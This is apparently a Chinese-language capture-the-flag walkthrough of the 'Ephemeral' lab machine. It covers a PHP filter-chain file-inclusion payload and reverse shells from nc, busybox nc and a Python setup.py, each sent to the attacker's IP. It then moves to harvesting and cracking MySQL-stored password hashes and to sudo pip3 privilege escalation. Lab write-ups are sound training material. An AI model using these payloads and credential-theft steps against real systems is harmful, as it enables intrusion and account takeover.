Z2luCmtlcm5vb3BzOng6MTE2OjY1NTM0Oktlcm5lbCBPb3BzIFRyYWNraW5nIERhZW1vbiwsLDovOi91c3Ivc2Jpbi9ub2xvZ2luCnNhbmVkOng6MTE3OjEyMzo6L3Zhci9saWIvc2FuZWQ6L3Vzci9zYmluL25vbG9naW4Kbm0tb3BlbnZwbjp4OjExODoxMjQ6TmV0d29ya01hbmFnZXIgT3BlblZQTiwsLDovdmFyL2xpYi9vcGVudnBuL2Nocm9vdDovdXNyL3NiaW4vbm9sb2dpbgpocGxpcDp4OjExOTo3OkhQTElQIHN5c3RlbSB1c2VyLCwsOi9ydW4vaHBsaXA6L2Jpbi9mYWxzZQp3aG9vcHNpZTp4OjEyMDoxMjU6Oi9ub25leGlzdGVudDovYmluL2ZhbHNlCmNvbG9yZDp4OjEyMToxMjY6Y29sb3JkIGNvbG91ciBtYW5hZ2VtZW50IGRhZW1vbiwsLDovdmFyL2xpYi9jb2xvcmQ6L3Vzci9zYmluL25vbG9naW4KZ2VvY2x1ZTp4OjEyMjoxMjc6Oi92YXIvbGliL2dlb2NsdWU6L3Vzci9zYmluL25vbG9naW4KcHVsc2U6eDoxMjM6MTI4OlB1bHNlQXVkaW8gZGFlbW9uLCwsOi92YXIvcnVuL3B1bHNlOi91c3Ivc2Jpbi9ub2xvZ2luCmdub21lLWluaXRpYWwtc2V0dXA6eDoxMjQ6NjU1MzQ6Oi9ydW4vZ25vbWUtaW5pdGlhbC1zZXR1cC86L2Jpbi9mYWxzZQpnZG06eDoxMjU6MTMwOkdub21lIERpc3BsYXkgTWFuYWdlcjovdmFyL2xpYi9nZG0zOi9iaW4vZmFsc2UKc3NzZDp4OjEyNjoxMzE6U1NTRCBzeXN0ZW0gdXNlciwsLDovdmFyL2xpYi9zc3M6L3Vzci9zYmluL25vbG9naW4Ka2V2aW46eDoxMDAwOjEwMDA6a2V2aW4sLCw6L2hvbWUva2V2aW46L2Jpbi9iYXNoCnN5c3RlbWQtY29yZWR1bXA6eDo5OTk6OTk5OnN5c3RlbWQgQ29yZSBEdW1wZXI6LzovdXNyL3NiaW4vbm9sb2dpbgpmdHA6eDoxMjc6MTM0OmZ0cCBkYWVtb24sLCw6L3Nydi9mdHA6L3Vzci9zYmluL25vbG9naW4Kc3NoZDp4OjEyODo2NTUzNDo6L3J1bi9zc2hkOi91c3Ivc2Jpbi9ub2xvZ2luCm15c3FsOng6MTI5OjEzNTpNeVNRTCBTZXJ2ZXIsLCw6L25vbmV4aXN0ZW50Oi9iaW4vZmFsc2UKamFuZTp4OjEwMDE6MTAwMTosLCw6L2hvbWUvamFuZTovYmluL2Jhc2gKZG9uYWxkOng6MTAwNDoxMDA0OjovaG9tZS9kb25hbGQ6L2Jpbi9yYmFzaApyYW5keTp4OjEwMDI6MTAwMjosLCw6L2hvbWUvcmFuZHk6L2Jpbi9iYXNoCg==
```

尝试构造php伪协议链：

```bash
http://192.168.0.148/prices/filedownload.php?AssignmentForm=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&0=whoami
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404301740592.png" alt="image-20240430151533944" style="zoom:50%;" />

进行[反弹shell](https://www.revshells.com/) ：

```bash
http://192.168.0.148/prices/filedownload.php?AssignmentForm=payload&0=nc -e /bin/bash 192.168.0.143 1234
```

但是没成功，尝试进行编码：

```bash
http://192.168.0.148/prices/filedownload.php?AssignmentForm=payload&0=nc+-e+%2Fbin%2Fbash+192.168.0.143+1234
```

再换一个：

```bash
http://192.168.0.148/prices/filedownload.php?AssignmentForm=payload&0=busybox%20nc%20192.168.0.143%201234%20-e%20bash
```

欸嘿，弹过来了！！！

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404301740593.png" alt="image-20240430152419053" style="zoom:50%;" />

## 提权

### 信息搜集

```bash
(remote) www-data@ephemeral:/var/www/html/prices$ ls -la
total 12
drwxr-xr-x  2 www-data www-data 4096 Mar 15  2022 .
drwxr-xr-x 11 www-data www-data 4096 Mar 17  2022 ..
-rw-r--r--  1 www-data www-data  150 Mar 15  2022 filedownload.php
(remote) www-data@ephemeral:/var/www/html/prices$ cd ..
(remote) www-data@ephemeral:/var/www/html$ ls -la
total 356
drwxr-xr-x 11 www-data www-data  4096 Mar 17  2022 .
drwxr-xr-x  3 root     root      4096 Mar 14  2022 ..
-rw-r--r--  1 www-data www-data  1309 Aug 12  2020 LICENSE.txt
-rw-r--r--  1 www-data www-data   541 Oct 11  2020 READ-ME.txt
-rw-r--r--  1 www-data www-data 18464 Oct 11  2020 about.html
-rw-r--r--  1 www-data www-data 20094 Oct 11  2020 blog.html
-rw-r--r--  1 www-data www-data 14677 Oct 11  2020 booking.html
-rw-r--r--  1 www-data www-data 66386 Oct 11  2020 car-wash-website-template.jpg
drwxr-xr-x  2 www-data www-data  4096 Mar 17  2022 cd
-rw-r--r--  1 www-data www-data 15151 Oct 11  2020 contact.html
drwxr-xr-x  2 www-data www-data  4096 Oct 11  2020 css
drwxr-xr-x  2 www-data www-data  4096 Oct 12  2020 img
-rw-r--r--  1 www-data www-data 39494 Oct 11  2020 index.html
drwxr-xr-x  2 www-data www-data  4096 Oct 11  2020 js
drwxr-xr-x  8 www-data www-data  4096 Oct 11  2020 lib
-rw-r--r--  1 www-data www-data 14685 Oct 11  2020 location.html
drwxr-xr-x  2 www-data www-data  4096 Oct 11  2020 mail
-rw-r--r--  1 www-data www-data    44 Mar 15  2022 phpsysinfo.php
drwxr-xr-x  2 www-data www-data  4096 Mar 17  2022 price
-rw-r--r--  1 www-data www-data 14635 Oct 11  2020 price.html
drwxr-xr-x  2 www-data www-data  4096 Mar 15  2022 prices
drwxr-xr-x  2 root     root      4096 Mar 17  2022 private_html
-rw-r--r--  1 www-data www-data 16853 Oct 11  2020 service.html
-rw-r--r--  1 www-data www-data 48856 Oct 11  2020 single.html
-rw-r--r--  1 www-data www-data 18605 Oct 11  2020 team.html
(remote) www-data@ephemeral:/var/www/html$ cd private_html/
(remote) www-data@ephemeral:/var/www/html/private_html$ ls -la
total 12
drwxr-xr-x  2 root     root     4096 Mar 17  2022 .
drwxr-xr-x 11 www-data www-data 4096 Mar 17  2022 ..
-rwxrwxr-x  1 root     root      337 Mar 17  2022 app.py
(remote) www-data@ephemeral:/var/www/html/private_html$ cat app.py 
from flask import Flask, request
from jinja2 import Environment

app = Flask(__name__)
Jinja2 = Environment()

@app.route("/page")
def page():

    name = request.values.get('name')


    output = Jinja2.from_string('Welcome ' + name + '!').render()


    return output

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
(remote) www-data@ephemeral:/var/www/html/private_html$ ss -atlp 
State            Recv-Q           Send-Q                       Local Address:Port                         Peer Address:Port           Process           
LISTEN           0                128                                0.0.0.0:ssh                               0.0.0.0:*                                
LISTEN           0                5                                127.0.0.1:ipp                               0.0.0.0:*                                
LISTEN           0                70                               127.0.0.1:33060                             0.0.0.0:*                                
LISTEN           0                151                              127.0.0.1:mysql                             0.0.0.0:*                                
LISTEN           0                4096                             127.0.0.1:41229                             0.0.0.0:*                                
LISTEN           0                4096                         127.0.0.53%lo:domain                            0.0.0.0:*                                
LISTEN           0                128                                   [::]:ssh                                  [::]:*                                
LISTEN           0                5                                    [::1]:ipp                                  [::]:*                                
LISTEN           0                511                                      *:http                                    *:*                                
LISTEN           0                32                                       *:ftp                                     *:*                                
(remote) www-data@ephemeral:/var/www/html/private_html$ ss -tnlup
Netid          State           Recv-Q          Send-Q                   Local Address:Port                    Peer Address:Port         Process         
udp            UNCONN          0               0                              0.0.0.0:631                          0.0.0.0:*                            
udp            UNCONN          0               0                        127.0.0.53%lo:53                           0.0.0.0:*                            
udp            UNCONN          0               0                              0.0.0.0:5353                         0.0.0.0:*                            
udp            UNCONN          0               0                              0.0.0.0:41443                        0.0.0.0:*                            
udp            UNCONN          0               0                                 [::]:60043                           [::]:*                            
udp            UNCONN          0               0                                 [::]:5353                            [::]:*                            
tcp            LISTEN          0               128                            0.0.0.0:22                           0.0.0.0:*                            
tcp            LISTEN          0               5                            127.0.0.1:631                          0.0.0.0:*                            
tcp            LISTEN          0               70                           127.0.0.1:33060                        0.0.0.0:*                            
tcp            LISTEN          0               151                          127.0.0.1:3306                         0.0.0.0:*                            
tcp            LISTEN          0               4096                         127.0.0.1:41229                        0.0.0.0:*                            
tcp            LISTEN          0               4096                     127.0.0.53%lo:53                           0.0.0.0:*                            
tcp            LISTEN          0               128                               [::]:22                              [::]:*                            
tcp            LISTEN          0               5                                [::1]:631                             [::]:*                            
tcp            LISTEN          0               511                                  *:80                                 *:*                            
tcp            LISTEN          0               32                                   *:21                                 *:* 
(remote) www-data@ephemeral:/var/www/html/private_html$ sudo -l
[sudo] password for www-data: 
(remote) www-data@ephemeral:/var/www/html/private_html$ cd ../
(remote) www-data@ephemeral:/var/www/html$ cd ../
(remote) www-data@ephemeral:/var/www$ ls -la
total 12
drwxr-xr-x  3 root     root     4096 Mar 14  2022 .
drwxr-xr-x 15 root     root     4096 Mar 14  2022 ..
drwxr-xr-x 11 www-data www-data 4096 Mar 17  2022 html
(remote) www-data@ephemeral:/var/www$ cd ../
(remote) www-data@ephemeral:/var$ ls -la
total 60
drwxr-xr-x 15 root root     4096 Mar 14  2022 .
drwxr-xr-x 21 root root     4096 Mar 17  2022 ..
drwxr-xr-x  2 root root     4096 Mar 18  2022 backups
drwxr-xr-x 18 root root     4096 Mar 15  2022 cache
drwxrwsrwt  2 root whoopsie 4096 Apr 29 23:56 crash
drwxr-xr-x 78 root root     4096 Mar 16  2022 lib
drwxrwsr-x  2 root staff    4096 Apr 15  2020 local
lrwxrwxrwx  1 root root        9 Mar 14  2022 lock -> /run/lock
drwxrwxr-x 15 root syslog   4096 Apr 29 23:52 log
drwxrwsr-x  2 root mail     4096 Feb 23  2022 mail
drwxrwsrwt  2 root whoopsie 4096 Feb 23  2022 metrics
drwxr-xr-x  2 root root     4096 Feb 23  2022 opt
lrwxrwxrwx  1 root root        4 Mar 14  2022 run -> /run
drwxr-xr-x  8 root root     4096 Feb 23  2022 snap
drwxr-xr-x  6 root root     4096 Mar 14  2022 spool
drwxrwxrwt  2 root root     4096 Apr 30  2024 tmp
drwxr-xr-x  3 root root     4096 Mar 14  2022 www
(remote) www-data@ephemeral:/var$ cd backups/
(remote) www-data@ephemeral:/var/backups$ ls -la
.............
(remote) www-data@ephemeral:/var/backups$ cd ../mail
(remote) www-data@ephemeral:/var/mail$ ls -la
total 8
drwxrwsr-x  2 root mail 4096 Feb 23  2022 .
drwxr-xr-x 15 root root 4096 Mar 14  2022 ..
(remote) www-data@ephemeral:/var/mail$ cd ../opt
(remote) www-data@ephemeral:/var/opt$ ls -la
total 8
drwxr-xr-x  2 root root 4096 Feb 23  2022 .
drwxr-xr-x 15 root root 4096 Mar 14  2022 ..
(remote) www-data@ephemeral:/var/opt$ cd ../tmp 
(remote) www-data@ephemeral:/var/tmp$ ls -la
total 8
drwxrwxrwt  2 root root 4096 Apr 30  2024 .
drwxr-xr-x 15 root root 4096 Mar 14  2022 ..
(remote) www-data@ephemeral:/var/tmp$ cat /etc/passwd | grep "bash"
root:x:0:0:root:/root:/bin/bash
kevin:x:1000:1000:kevin,,,:/home/kevin:/bin/bash
jane:x:1001:1001:,,,:/home/jane:/bin/bash
donald:x:1004:1004::/home/donald:/bin/rbash
randy:x:1002:1002:,,,:/home/randy:/bin/bash
(remote) www-data@ephemeral:/var/tmp$ cd /home
(remote) www-data@ephemeral:/home$ ls -la
total 24
drwxr-xr-x  6 root   root   4096 Mar 15  2022 .
drwxr-xr-x 21 root   root   4096 Mar 17  2022 ..
drwx------  8 donald donald 4096 Mar 17  2022 donald
drwx------  6 jane   jane   4096 Mar 17  2022 jane
drwx------ 14 kevin  kevin  4096 Mar 17  2022 kevin
drwx------  6 randy  randy  4096 Mar 17  2022 randy
(remote) www-data@ephemeral:/home$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/chsh
/usr/bin/umount
/usr/bin/fusermount
/usr/bin/screen-4.5.0
/usr/bin/passwd
/usr/bin/vmware-user-suid-wrapper
/usr/bin/su
/usr/bin/sudo
/usr/bin/mount
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/xorg/Xorg.wrap
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/sbin/pppd
/snap/core20/2264/usr/bin/chfn
/snap/core20/2264/usr/bin/chsh
/snap/core20/2264/usr/bin/gpasswd
/snap/core20/2264/usr/bin/mount
/snap/core20/2264/usr/bin/newgrp
/snap/core20/2264/usr/bin/passwd
/snap/core20/2264/usr/bin/su
/snap/core20/2264/usr/bin/sudo
/snap/core20/2264/usr/bin/umount
/snap/core20/2264/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2264/usr/lib/openssh/ssh-keysign
/snap/core20/1376/usr/bin/chfn
/snap/core20/1376/usr/bin/chsh
/snap/core20/1376/usr/bin/gpasswd
/snap/core20/1376/usr/bin/mount
/snap/core20/1376/usr/bin/newgrp
/snap/core20/1376/usr/bin/passwd
/snap/core20/1376/usr/bin/su
/snap/core20/1376/usr/bin/sudo
/snap/core20/1376/usr/bin/umount
/snap/core20/1376/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1376/usr/lib/openssh/ssh-keysign
/snap/snapd/21465/usr/lib/snapd/snap-confine
(remote) www-data@ephemeral:/home$ /usr/sbin/getcap -r / 2>/dev/null
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/snap/core20/2264/usr/bin/ping = cap_net_raw+ep
/snap/core20/1376/usr/bin/ping = cap_net_raw+ep
(remote) www-data@ephemeral:/home$ cd /opt
(remote) www-data@ephemeral:/opt$ ls -la
total 12
drwxr-xr-x  3 root root 4096 Mar 16  2022 .
drwxr-xr-x 21 root root 4096 Mar 17  2022 ..
drwx--x--x  4 root root 4096 Mar 16  2022 containerd
```

### 上传linpeas.sh 和 pspy64

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404301740594.png" alt="image-20240430153615327" style="zoom: 33%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404301740595.png" alt="image-20240430153822808" style="zoom:33%;" />

```bash
╔══════════╣ Checking if containerd(ctr) is available
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/containerd-ctr-privilege-escalation
ctr was found in /usr/bin/ctr, you may be able to escalate privileges with it
ctr: failed to dial "/run/containerd/containerd.sock": connection error: desc = "transport: error while dialing: dial unix /run/containerd/containerd.sock: connect: permission denied"

╔══════════╣ Checking if runc is available
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/runc-privilege-escalation
runc was found in /usr/sbin/runc, you may be able to escalate privileges with it
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404301740596.png" alt="image-20240430154415208" style="zoom:50%;" />

### Mysql获取信息

尝试查看一下相关信息：

```bash
(remote) www-data@ephemeral:/tmp$ cd /etc/mysql
(remote) www-data@ephemeral:/etc/mysql$ ls -la
total 44
drwxr-xr-x   4 root root  4096 Mar 15  2022 .
drwxr-xr-x 134 root root 12288 Mar 18  2022 ..
-rw-r--r--   1 root root    49 Mar 15  2022 .my.cnf
drwxr-xr-x   2 root root  4096 Feb 23  2022 conf.d
-rwxr-xr-x   1 root root   120 Jan 28  2022 debian-start
-rw-------   1 root root   317 Mar 15  2022 debian.cnf
lrwxrwxrwx   1 root root    24 Mar 14  2022 my.cnf -> /etc/alternatives/my.cnf
-rw-r--r--   1 root root   839 Aug  3  2016 my.cnf.fallback
-rw-r--r--   1 root root   682 Aug 19  2021 mysql.cnf
drwxr-xr-x   2 root root  4096 Mar 15  2022 mysql.conf.d
(remote) www-data@ephemeral:/etc/mysql$ cat .my.cnf
[client]
user=root
password=RanDydBPa$$w0rd0987
```

拿到数据库密码，尝试登录：

```bash
(remote) www-data@ephemeral:/$ mysql -u  root -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 13
Server version: 8.0.28-0ubuntu0.20.04.3 (Ubuntu)

Copyright (c) 2000, 2022, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| ephemeral_users    |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.50 sec)

mysql> use ephemeral_users;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+---------------------------+
| Tables_in_ephemeral_users |
+---------------------------+
| ephemeral_users           |
+---------------------------+
1 row in set (0.00 sec)

mysql> select * from ephemeral_users;
+--------+------------------------------------------+
| user   | password                                 |
+--------+------------------------------------------+
| kevin  | a7f30291fe998b2f188678090b40d8307ffdeddd |
| donald | 603ebcdd05c78c0a635b7b0846ef8ad5758b6d7c |
| jane   | 84f66bc55f616fe45b4d996896e4c9e4121264ef |
| randy  | d1b10494107b459a80df1e1d5b9b62bd0b24a1ce |
+--------+------------------------------------------+
4 rows in set (0.11 sec)
```

尝试进行[破译](https://crackstation.net/) ！

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404301740597.png" alt="image-20240430154854699" style="zoom:50%;" />

```apl
kevin			jameskevingilmerjr
donald			24donaldson
jane			!pass_word
randy			!password!23
```

尝试进行爆破：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404301740598.png" alt="image-20240430155156924" style="zoom:50%;" />

### kevin->donald

```bash
(remote) www-data@ephemeral:/$ su -l kevin
Password: 
kevin@ephemeral:~$ ls -la
total 76
drwx------ 14 kevin kevin 4096 Mar 17  2022 .
drwxr-xr-x  6 root  root  4096 Mar 15  2022 ..
lrwxrwxrwx  1 root  root     9 Mar 15  2022 .bash_history -> /dev/null
-rw-r--r--  1 kevin kevin  220 Mar 14  2022 .bash_logout
-rw-r--r--  1 kevin kevin 3771 Mar 14  2022 .bashrc
drwxrwxr-x 12 kevin kevin 4096 Apr 30 01:51 .cache
drwx------ 11 kevin kevin 4096 Mar 16  2022 .config
drwxr-xr-x  2 kevin kevin 4096 Mar 14  2022 Desktop
drwxr-xr-x  2 kevin kevin 4096 Mar 14  2022 Documents
drwxr-xr-x  2 kevin kevin 4096 Mar 14  2022 Downloads
drwx------  3 kevin kevin 4096 Mar 17  2022 .gnupg
drwxr-xr-x  4 kevin kevin 4096 Mar 15  2022 .local
drwxr-xr-x  2 kevin kevin 4096 Mar 14  2022 Music
drwxr-xr-x  2 kevin kevin 4096 Mar 14  2022 Pictures
-rw-r--r--  1 kevin kevin  807 Mar 14  2022 .profile
drwxr-xr-x  2 kevin kevin 4096 Mar 14  2022 Public
-rw-------  1 kevin kevin  100 Mar 15  2022 .python_history
-rw-r--r--  1 kevin kevin    0 Mar 14  2022 .sudo_as_admin_successful
drwxr-xr-x  2 kevin kevin 4096 Mar 14  2022 Templates
drwxr-xr-x  2 kevin kevin 4096 Mar 14  2022 Videos
-rw-rw-r--  1 kevin kevin  180 Mar 16  2022 .wget-hsts
kevin@ephemeral:~$ sudo -l
[sudo] password for kevin: 
Matching Defaults entries for kevin on ephemeral:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User kevin may run the following commands on ephemeral:
    (donald) PASSWD: /usr/bin/pip3 install *
```

尝试提权：https://gtfobins.github.io/gtfobins/pip/#sudo

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404301740599.png" alt="image-20240430155527899" style="zoom:50%;" />

尝试一下：

```bash
kevin@ephemeral:~$ TF=$(mktemp -d)
kevin@ephemeral:~$ echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
kevin@ephemeral:~$ sudo -l
Matching Defaults entries for kevin on ephemeral:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User kevin may run the following commands on ephemeral:
    (donald) PASSWD: /usr/bin/pip3 install *
kevin@ephemeral:~$ sudo -u donald /usr/bin/pip3 install $TF
ERROR: Directory '/tmp/tmp.7PN4bblEXQ' is not installable. Neither 'setup.py' nor 'pyproject.toml' found.
kevin@ephemeral:/tmp/tmp.7PN4bblEXQ$ ls -la
total 12
drwx------ 2 kevin kevin 4096 Apr 30 01:59 .
drwxrwxrwt 3 root  root  4096 Apr 30 01:59 ..
-rw-rw-r-- 1 kevin kevin   86 Apr 30 01:59 setup.py
```

wtf？尝试一下反弹shell吧：

```bash
kevin@ephemeral:/tmp$ echo 'import os,pty,socket;s=socket.socket();s.connect(("192.168.0.143",2345));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")' > exp/setup.py
kevin@ephemeral:/tmp$ chmod +x exp/setup.py 
kevin@ephemeral:/tmp$ sudo -u donald /usr/bin/pip3 install /tmp/exp/
Processing ./exp
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404301740600.png" alt="image-20240430161442176" style="zoom:50%;" />

### donald->jane

```bash
(remote) donald@ephemeral:/tmp/pip-req-build-zwnyglvc$ cd /home/donald/
(remote) donald@ephemeral:/home/donald$ ls -la
total 216
drwx------ 8 donald donald   4096 Mar 17  2022 .
drwxr-xr-x 6 root   root     4096 Mar 15  2022 ..
-rw------- 1 donald donald 158122 Mar 17  2022 .bash_history
-rw-r--r-- 1 donald donald    220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 donald donald   3771 Feb 25  2020 .bashrc
drwx------ 4 donald donald   4096 Mar 15  2022 .cache
drwxr-xr-x 2 root   root     4096 Mar 15  2022 commands
drwx------ 4 donald donald   4096 Mar 15  2022 .config
drwxrwxr-x 2 donald donald   4096 Mar 16  2022 Desktop
drwxr-xr-x 3 donald donald   4096 Mar 15  2022 .local
-rw-rw-r-- 1 donald donald     28 Mar 16  2022 mypass.txt
-rw-r--r-- 1 donald donald    178 Mar 16  2022 note.txt
-rwxr-xr-x 1 root   root      891 Mar 15  2022 .profile
-rw------- 1 donald donald     33 Mar 15  2022 .python_history
drwx------ 2 donald donald   4096 Mar 16  2022 .ssh
-rw-rw-r-- 1 donald donald    173 Mar 16  2022 .wget-hsts
(remote) donald@ephemeral:/home/donald$ cat *.txt
FjqSy9KKWgSdc65usJ7yoPNIokz
Hey Donald this is your system administrator. I left your new password in your home directory. 
Just remember to decode it.

Let me know if you need your password changed again.
(remote) donald@ephemeral:/home/donald$ cat .bash_history 
```

在历史文件中发现很多东西：

```bash
wget https://www.exploit-db.com/raw/41154 -O exploit.c
ls -la 
gcc exploit.c -o exploit
ls -la 
clear
ls -la 
rm -r exploit.c 
clear
```

```bash
sudo -u jane /usr/local/bin/addKeys.sh
cd ..
ls -la 
cd keys/
ls -la ~
sudo -u jane /usr/local/bin/addKeys.sh
ls -l /home/jane/
cd
```

```bash
ssh jane@10.0.0.179
exit
ssh donald@10.0.0.179 -t "bash --noprofile"
exit 
clear
```

感觉像是作者无心之失，接着按我们的方法尝试进行解码：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404301740601.png" alt="image-20240430162116128" style="zoom:50%;" />

```apl
nORMAniAntIcINacKLAi
```

尝试一下：

```bash
(remote) donald@ephemeral:/home/donald$ sudo -l
[sudo] password for donald: 
Matching Defaults entries for donald on ephemeral:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User donald may run the following commands on ephemeral:
    (jane) PASSWD: /usr/local/bin/addKeys.sh
(remote) donald@ephemeral:/home/donald$ cat /usr/local/bin/addKeys.sh
#!/bin/bash

/usr/bin/rm -rf /dev/shm/id_rsa.pub
/usr/bin/rm -rf /dev/shm/id_rsa

/usr/bin/ssh-keygen -q -t rsa -N '' -f /dev/shm/id_rsa

/bin/echo "Keys Added!"

/usr/bin/rm -rf /home/jane/.ssh/

/bin/echo "Directory Deleted!"

/usr/bin/mkdir /home/jane/.ssh/

/bin/echo ".ssh Directory Created!"

/usr/bin/cp /dev/shm/id_rsa.pub /home/jane/.ssh/authorized_keys

/bin/echo "Keys Copied."

/usr/bin/chmod 600 /home/jane/.ssh/authorized_keys

/bin/echo "Permissions Changed!"

/usr/bin/rm -rf /dev/shm/id_rsa
/usr/bin/rm -rf /dev/shm/id_rsa.pub 

/bin/echo "Keys Removed!"






```

这个脚本都是绝对路径，利用不了，见缝插针进行登录：

```bash
(remote) donald@ephemeral:/dev/shm$ ls -la
total 0
drwxrwxrwx  2 root root   40 Apr 30  2024 .
drwxr-xr-x 19 root root 3980 Apr 29 23:57 ..
```

权限较高，尝试进行利用：

```bash
┌──(kali💀kali)-[~/temp/Ephemeral]
└─$ ssh donald@192.168.0.148                                      
The authenticity of host '192.168.0.148 (192.168.0.148)' can't be established.
ED25519 key fingerprint is SHA256:Lsf/x4H3iybf7oKWrpIkzv3slmryI1uJdNMK6/3BVwg.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added '192.168.0.148' (ED25519) to the list of known hosts.
donald@192.168.0.148's password: 
